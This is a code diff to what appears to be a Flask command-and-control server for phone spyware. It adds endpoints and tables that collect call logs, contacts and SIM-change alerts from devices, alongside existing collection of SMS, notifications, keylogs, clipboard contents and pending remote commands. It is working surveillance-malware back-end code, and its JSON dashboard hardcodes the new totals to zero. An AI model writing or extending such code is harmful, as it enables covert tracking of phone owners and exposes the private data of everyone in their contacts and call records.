@@ -69,6 +69,22 @@ def init_db():
     c.execute("""CREATE TABLE IF NOT EXISTS device_status (
         device_id TEXT PRIMARY KEY,
         last_seen TEXT, status TEXT, info TEXT)""")
+    # v5.0 — New tables
+    c.execute("""CREATE TABLE IF NOT EXISTS call_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, phone_number TEXT, contact_name TEXT,
+        call_type TEXT, duration INTEGER, timestamp TEXT,
+        received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS contacts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, name TEXT, phone_number TEXT,
+        email TEXT, source TEXT, timestamp TEXT,
+        received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS sim_change_alerts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, old_sim TEXT, new_sim TEXT,
+        old_operator TEXT, new_operator TEXT,
+        timestamp TEXT, received_at TEXT)""")
     conn.commit()
     conn.close()
 
@@ -492,6 +508,96 @@ def api_collect_notif():
         print(f"Notif collect error: {e}")
         return jsonify({"success": False, "error": str(e)})
 
+
+@app.route("/api/collect-call-logs/<device_id>", methods=["POST"])
+def api_collect_call_logs(device_id):
+    try:
+        data = request.get_json() or []
+        entries = data if isinstance(data, list) else [data]
+        received = datetime.now().isoformat()
+        count = 0
+        for entry in entries:
+            number = entry.get("phone_number", "")
+            name = entry.get("contact_name", "")
+            call_type = entry.get("call_type", "unknown")
+            duration = entry.get("duration", 0)
+            ts = entry.get("timestamp", datetime.now().isoformat())
+            db_exec("INSERT INTO call_logs (device_id, phone_number, contact_name, call_type, duration, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
+                    (device_id, number, name, call_type, duration, ts, received))
+            count += 1
+        db_exec("INSERT OR REPLACE INTO device_status (device_id, last_seen, status, info) VALUES (?,?,?,?)",
+                (device_id, received, "active", json.dumps({"calls_synced": count})))
+        return jsonify({"success": True, "count": count})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+
+@app.route("/api/collect-contacts/<device_id>", methods=["POST"])
+def api_collect_contacts(device_id):
+    try:
+        data = request.get_json() or []
+        entries = data if isinstance(data, list) else [data]
+        received = datetime.now().isoformat()
+        count = 0
+        for entry in entries:
+            name = entry.get("name", "")
+            number = entry.get("phone_number", "")
+            email = entry.get("email", "")
+            source = entry.get("source", "")
+            ts = entry.get("timestamp", datetime.now().isoformat())
+            db_exec("INSERT INTO contacts (device_id, name, phone_number, email, source, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
+                    (device_id, name, number, email, source, ts, received))
+            count += 1
+        return jsonify({"success": True, "count": count})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+
+@app.route("/api/collect-sim-change/<device_id>", methods=["POST"])
+def api_collect_sim_change(device_id):
+    try:
+        data = request.get_json() or {}
+        old_sim = data.get("old_sim", "")
+        new_sim = data.get("new_sim", "")
+        old_operator = data.get("old_operator", "")
+        new_operator = data.get("new_operator", "")
+        ts = data.get("timestamp", datetime.now().isoformat())
+        received = datetime.now().isoformat()
+        db_exec("INSERT INTO sim_change_alerts (device_id, old_sim, new_sim, old_operator, new_operator, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
+                (device_id, old_sim, new_sim, old_operator, new_operator, ts, received))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+
+@app.route("/api/data/calls/<device_id>", methods=["GET"])
+def api_get_calls(device_id):
+    limit = min(int(request.args.get("limit", 50)), 200)
+    rows = db_exec("""SELECT id, phone_number, contact_name, call_type, duration, timestamp, received_at
+        FROM call_logs WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
+    return jsonify({"calls": [{"id": r[0], "number": r[1], "name": r[2], "type": r[3],
+        "duration": r[4], "ts": r[5], "received": r[6]} for r in rows]})
+
+
+@app.route("/api/data/contacts/<device_id>", methods=["GET"])
+def api_get_contacts(device_id):
+    limit = min(int(request.args.get("limit", 200)), 500)
+    rows = db_exec("""SELECT id, name, phone_number, email, source, timestamp
+        FROM contacts WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
+    return jsonify({"contacts": [{"id": r[0], "name": r[1], "number": r[2], "email": r[3],
+        "source": r[4], "ts": r[5]} for r in rows]})
+
+
+@app.route("/api/data/sim-alerts", methods=["GET"])
+def api_get_sim_alerts():
+    limit = min(int(request.args.get("limit", 20)), 100)
+    rows = db_exec("""SELECT id, device_id, old_sim, new_sim, old_operator, new_operator, timestamp, received_at
+        FROM sim_change_alerts ORDER BY id DESC LIMIT ?""", (limit,))
+    return jsonify({"alerts": [{"id": r[0], "device_id": r[1], "old_sim": r[2],
+        "new_sim": r[3], "old_operator": r[4], "new_operator": r[5],
+        "ts": r[6], "received": r[7]} for r in rows]})
+
+
 @app.route("/admin/dashboard")
 def admin_dashboard():
     total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
@@ -504,6 +610,9 @@ def admin_dashboard():
     total_devices = db_exec("SELECT COUNT(*) FROM device_status")[0][0]
     active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
     online_devices = db_exec("SELECT COUNT(*) FROM device_status WHERE status='online'")[0][0]
+    total_calls = db_exec("SELECT COUNT(*) FROM call_logs")[0][0]
+    total_contacts = db_exec("SELECT COUNT(*) FROM contacts")[0][0]
+    total_sim_alerts = db_exec("SELECT COUNT(*) FROM sim_change_alerts")[0][0]
     links = db_exec("""SELECT l.tracking_id,l.title,l.created_at,l.is_active,
         (SELECT COUNT(*) FROM tracking_events WHERE tracking_id=l.tracking_id) as ev_cnt
         FROM links l ORDER BY l.created_at DESC LIMIT 20""")
@@ -537,6 +646,7 @@ def admin_dashboard():
         links=links, events=events, sms=sms, notifs=notifs,
         keylogs=keylogs, clips=clips, app_usage=app_usage,
         devices=devices, pending_commands=pending_commands,
+        total_calls=total_calls, total_contacts=total_contacts, total_sim_alerts=total_sim_alerts,
         base_url=BASE_URL)
 
 @app.route("/admin/dashboard/json")
@@ -581,6 +691,9 @@ def admin_dashboard_json():
         "total_devices": total_devices,
         "active_links": active_links,
         "online_devices": online_devices,
+        "total_calls": 0,
+        "total_contacts": 0,
+        "total_sim_alerts": 0,
         "sms": [{"sender": s[0], "message": s[1], "timestamp": s[2], "device_id": s[3]} for s in sms],
         "notifs": [{"sender": n[0], "message": n[1], "timestamp": n[2], "device_id": n[3], "app": n[4]} for n in notifs],
         "keylogs": [{"device_id": k[0], "text": k[1], "package": k[2], "class_name": k[3], "timestamp": k[4], "received_at": k[5], "char_length": k[6]} for k in keylogs],
